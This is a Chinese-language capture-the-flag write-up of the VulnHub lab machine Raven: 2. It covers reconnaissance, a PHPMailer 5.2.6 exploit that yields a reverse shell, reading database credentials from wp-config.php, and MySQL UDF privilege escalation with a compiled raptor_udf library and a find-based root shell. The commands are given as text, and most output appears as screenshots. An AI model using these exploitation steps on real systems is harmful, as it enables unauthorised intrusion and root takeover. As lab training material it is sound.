---
title: ' Raven: 2 MYSQL udf提权'
date: 2021-08-19 00:03:22
updated: 2021-08-19 00:03:22
categories: 漏洞复现
password: npfs2333
---



MYSQL udf提权实战<!--more-->

# Raven: 2靶场介绍
在学习了上一篇章（MYSQL udf提权）的基础上，进行实战学习，并作如下记录

靶机Raven: 2下载地址：https://www.vulnhub.com/entry/raven-2,269/

渗透要求：靶机需要获得root权限，并找到flag


# 环境配置
将下载的ovawen文件导入vmware

因为不知道靶机的IP，需要扫描，为了方便做题，我们需要将靶机和kali放在同一个局域网里面，这里我选择桥接模式

![图片描述](https://static.cdnjs.cloud/20210808/image-1628388072613_816924564271.png)

注意下靶机和kali的网络适配器都要选桥接
![图片描述](https://static.cdnjs.cloud/20210808/image-1628388123481_640258364027.png)

这里建议连热点来做，不知道为什么连wifi的时候nmap扫不到IP地址


# 信息收集
## 存活主机探测
```
arp-scan -l
```
![图片描述](https://static.cdnjs.cloud/20210810/image-1628590847277_283459297822.png)

靶机IP地址为192.168.43.192



## 端口扫描

![图片描述](https://static.cdnjs.cloud/20210810/image-1628605945631_938631680644.png)


## 目录扫描

![图片描述](https://static.cdnjs.cloud/20210810/image-1628606197032_358991010068.png)

## 网站信息

![图片描述](https://static.cdnjs.cloud/20210810/image-1628606358888_234276356873.png)


# 漏洞发现
## flag1
访问 http://192.168.43.192/vendor/ 发现，该路径存在目录遍历：
![图片描述](https://static.cdnjs.cloud/20210810/image-1628606798686_44145777811.png)

查看 PATH 文件可得到 flag1

![图片描述](https://static.cdnjs.cloud/20210810/image-1628606850757_687915674728.png)

## flag2
在vendor路径下，还有一个文件名值得注意，那就是 VERSION，查看该文件可看到一个版本号：5.2.6

![图片描述](https://static.cdnjs.cloud/20210810/image-1628606960527_728200025593.png)

我们在看下vendor目录下的其他文件，发现有多个文件的文件名含有 phpmailer ，如 PHPMailerAutoload.php ，由此可确定 5.2.6 是 PHPMailer 的版本号。
![图片描述](https://static.cdnjs.cloud/20210810/image-1628607046543_664796755445.png)

于是使用 searchsploit 在 exploit-db 中搜索 PHPMailer 相关的 exp：

![图片描述](https://static.cdnjs.cloud/20210810/image-1628607126883_123346083982.png)

这里我们选择 40974.py,利用一下命令将脚本下载下来
```
searchsploit -m 40974.py
```

![图片描述](https://static.cdnjs.cloud/20210810/image-1628607544800_176210816360.png)

修改 40974.py，如下：
这里的contact.php是邮箱地址
![图片描述](https://static.cdnjs.cloud/20210810/image-1628608177610_747412707734.png)

脚本开始加上# -*- coding: utf-8 -*-防止编码报错，然后运行 40974.py，并在攻击机监听4444端口，访问   192.168.43.192/shell.php  ，攻击机会得到一个反向 shell

![图片描述](https://static.cdnjs.cloud/20210810/image-1628609132481_590647677420.png)

发现flag2

![图片描述](https://static.cdnjs.cloud/20210810/image-1628609499281_489687888708.png)


顺便用find命令搜索一下flag3和flag4
```
find / -type f -name 'flag[3-4].*' 2>/dev/null
/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png
```
浏览器访问
```
http://192.168.43.192/wordpress/wp-content/uploads/2018/11/flag3.png
```

![图片描述](https://static.cdnjs.cloud/20210810/image-1628609712886_707588891543.png)
# 提权

利用<a href="https://github.com/rebootuser/LinEnum">LinEnum</a>查看linux信息, 将 LinEnum.sh 脚本导入到靶机中，该脚本可以枚举各种 Linux 系统的各种信息

在本地开个http.server服务
![图片描述](https://static.cdnjs.cloud/20210810/image-1628612006693_30762216403.png)
![图片描述](https://static.cdnjs.cloud/20210810/image-1628612023563_553519751878.png)

在靶机上利用wget命令下载 LinEnum.sh文件

![图片描述](https://static.cdnjs.cloud/20210810/image-1628612075627_340471532911.png)

用python切换到交互shell `python -c 'import pty;pty.spawn("/bin/bash")' `

![图片描述](https://static.cdnjs.cloud/20210810/image-1628612274987_424545929100.png)

给linenum.sh文件加执行权限
```
chmod +x LinEnum.sh
```

执行，查看以root用户身份运行的所有进程

![图片描述](https://static.cdnjs.cloud/20210810/image-1628612607839_125853426258.png)
可以看到靶机上运行着 MySQL 服务

另外，通过 `ps -ef |grep mysql` 查看进程得知，MySQL 服务使以 root 权限启动的，因此想到利用 MySQL UDF 进行提权
![图片描述](https://static.cdnjs.cloud/20210810/image-1628612656518_258060057267.png)


从wordpress的配置文件wp-config.php中可以发现数据库账号密码
![图片描述](https://static.cdnjs.cloud/20210810/image-1628612837657_457992453649.png)

登录数据库mysql –u root -p进行登录，查看数据库版本

![图片描述](https://static.cdnjs.cloud/20210810/image-1628612927008_497559046805.png)

可以进行提权

查找相关exploit
```
searchsploit mysql udf
```

![图片描述](https://static.cdnjs.cloud/20210811/image-1628647198164_278619732869.png)

这里选择用 1518.c，下载：
```
searchsploit  -m 1518.c
```
![图片描述](https://static.cdnjs.cloud/20210811/image-1628647337785_794846014022.png)

打开 1518.c 里面有使用说明：
```
cat 1518.c
```
![图片描述](https://static.cdnjs.cloud/20210811/image-1628647392439_524514678680.png)

按照使用手册进行编译，生成so文件之后启动一个httpserver服务，靶机下载so文件
```
mv 1518.c  raptor_udf.c
gcc -g -c raptor_udf.c
gcc -g -shared -o  raptor_udf.so raptor_udf.o -lc
```
![图片描述](https://static.cdnjs.cloud/20210811/image-1628650439144_982484733625.png)
```
注释：
-g 生成调试信息
-c 编译（二进制）
-shared：创建一个动态链接库，输入文件可以是源文件、汇编文件或者目标文件。
-o：执行命令后的文件名
-lc：-l 库 c库名
```
![图片描述](https://static.cdnjs.cloud/20210811/image-1628649005419_561604154883.png)

参照usage 执行Mysq命令

![图片描述](https://static.cdnjs.cloud/20210811/image-1628650247340_492490180958.png)

最后进行find提权
```
find / -exec "/bin/sh" \;
```

![图片描述](https://static.cdnjs.cloud/20210811/image-1628650503654_718556499140.png)


## flag4
![图片描述](https://static.cdnjs.cloud/20210811/image-1628650668866_463976602861.png)